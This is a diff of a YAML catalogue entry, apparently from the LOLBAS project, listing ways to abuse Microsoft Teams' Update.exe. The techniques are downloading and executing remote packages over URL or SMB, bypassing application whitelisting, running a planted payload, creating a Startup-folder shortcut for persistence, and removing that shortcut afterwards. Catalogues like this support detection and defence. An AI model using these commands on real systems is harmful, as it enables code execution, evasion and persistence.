@@ -1,100 +1,133 @@
 ---
 Name: Update.exe
 Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2019-06-26
 Commands:
-  - Command: Update.exe --download [url to package]
+  - Command: Update.exe --download {REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download binary
     Category: Download
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update=[url to package]
+  - Command: Update.exe --update={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update=[url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --update={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update=\\remoteserver\payloadFolder
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --update={PATH_SMB:folder}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update=\\remoteserver\payloadFolder
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --update={PATH_SMB:folder}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --updateRollback=[url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --updateRollback={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --updateRollback=[url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --updateRollback={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
     Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
     Usecase: Application Whitelisting Bypass
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
+  - Command: Update.exe --updateRollback={PATH_SMB:folder}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --updateRollback={PATH_SMB:folder}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
     Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
     Usecase: Execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --createShortcut=payload.exe -l=Startup
-    Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
+    Tags:
+      - Execute: CMD
+  - Command: Update.exe --createShortcut={PATH:.exe} -l=Startup
+    Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
     Usecase: Execute binary
     Category: Execute
     Privileges: User
     MitreID: T1547
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --removeShortcut=payload.exe -l=Startup
+    Tags:
+      - Execute: EXE
+  - Command: Update.exe --removeShortcut={PATH:.exe}-l=Startup
     Description: Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.
     Usecase: Execute binary
     Category: Execute
     Privileges: User
     MitreID: T1070
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: EXE
 Full_Path:
   - Path: 'C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe'
 Code_Sample:
